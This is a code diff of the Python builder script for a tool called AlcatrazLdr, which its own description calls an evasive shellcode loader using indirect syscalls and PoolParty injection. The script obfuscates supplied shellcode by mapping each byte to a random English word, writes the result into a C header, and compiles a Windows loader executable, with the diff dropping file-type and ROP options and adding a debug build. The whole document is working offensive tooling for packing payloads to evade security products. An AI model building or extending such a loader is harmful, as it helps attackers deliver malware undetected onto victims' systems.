@@ -1,4 +1,3 @@
-# TODO: Finish it
 from os import path
 from stone_color.messages import *
 
@@ -8,7 +7,6 @@ import random
 import json
 
 __dir__ = path.dirname(__file__)
-file_types = ["shellcode", "dll", "pe"]
 
 def list_to_c_array_str(l: list, varname = None) -> str:
     if varname is None:
@@ -42,7 +40,7 @@ def shellcode_encoder(shellcode: bytes) -> tuple[list[str], list[str]]:
     while len(shellcode_alphabet) < 256:
         random_word = random.choice(english_words)
 
-        if not random_word in shellcode_alphabet:
+        if random_word not in shellcode_alphabet:
             shellcode_alphabet.append(random_word)
 
     # Converts shellcode bytes to words by alphabet random-words
@@ -65,44 +63,47 @@ def main(parser: argparse.ArgumentParser):
         errorf(e)
         quit(1)
 
-    if args.type == file_types[0]: # shellcode
-        infof("Encoding...")
-        shellcode_alphabet, shellcode_encoded = shellcode_encoder(file_fd.read())
-        cargo_fd = open(path.join(__dir__, "src", "shellcode", "cargo.h"), "w")
+    infof("Encoding...")
+    shellcode_alphabet, shellcode_encoded = shellcode_encoder(file_fd.read())
+    cargo_fd = open(path.join(__dir__, "src", "shellcode", "cargo.h"), "w")
 
-        # Writes the shellcode encoded into src/shellcode/cargo.h as array of `unsigned char`
+    # Writes the shellcode encoded into src/shellcode/cargo.h as array of `unsigned char`
 
-        cargo_fd.write(
-            "#ifndef CARGO_H\n#define CARGO_H\n"
-            +
-            "const " + list_to_c_array_str(shellcode_alphabet, "shellcode_alphabet") 
-            +
-            "\nconst " + list_to_c_array_str(shellcode_encoded, "shellcode_encoded")
-            +
-            "\n#endif"
-        )
+    cargo_fd.write(
+        "#ifndef CARGO_H\n#define CARGO_H\n"
+        +
+        "const " + list_to_c_array_str(shellcode_alphabet, "shellcode_alphabet") 
+        +
+        "\nconst " + list_to_c_array_str(shellcode_encoded, "shellcode_encoded")
+        +
+        "\n#endif"
+    )
 
-        successf("Shellcode has been encoded and writed into 'src/shellcode/cargo.h'")
-    else:
-        errorf("File type not supported")
+    successf("Shellcode has been encoded and writed into 'src/shellcode/cargo.h'")
 
     # Building executable
 
-    infof("Building AlcatrazLdr")
-    make_status_code = subprocess.run(["make", "clean", "all"], cwd=__dir__).returncode
+    if args.debug:
+        compile_cmd = ["make", "clean", "debug"]
+    else:
+        compile_cmd = ["make", "clean", "all"]
+
+    printf("=" * 40 + " Building AlcatrazLdr STARTED " + "=" * 40)
+    make_status_code = subprocess.run(compile_cmd, cwd=__dir__).returncode
     if make_status_code != 0:
         errorf("AlcatrazLdr building has been failed")
     else:
         successf("file has been saved into: 'out/alcatrazLdr.exe'")
 
+    printf("=" * 40 + " Building AlcatrazLdr ENDED " + "=" * 42)
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
         prog="AlcatrazLdr",
-        description="TODO",
+        description="Evasive shellcode loader with indirect syscalls, Thread name-calling allocation, PoolParty injection",
     )
     parser.add_argument("file", help="File to embed into the loader")
-    parser.add_argument("type", help="Type of file", choices=file_types)
-    parser.add_argument("--rop", help="ROP-chain code loading")
     parser.add_argument("--quiet", "-q", help="No banner", action="store_true")
+    parser.add_argument("--debug", "-d", help="Debug flag", action="store_true")
 
     main(parser)
